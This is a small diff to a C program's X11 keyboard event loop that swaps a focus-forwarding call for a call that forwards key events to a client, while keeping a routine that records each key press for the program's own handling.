@@ -74,13 +74,13 @@ int main() {
 		if( (len = XLookupString(&event.xkey, buf, 1, &keysym, NULL)) == 0 )
 			buf[0] = '\0';
 
+		// forward event to client
+		sendSpecEvent(dpy, keysym, event.xkey);
+
 		if(event.type == KeyPress) {
-			sendKeyToFocus(dpy, buf);
 			// save key for me
 			handleChar(connected, buf, keysym);
 		}
-
-		//printf("\n%lu\n", event.xany.serial);
 		
 		i++;
 	}
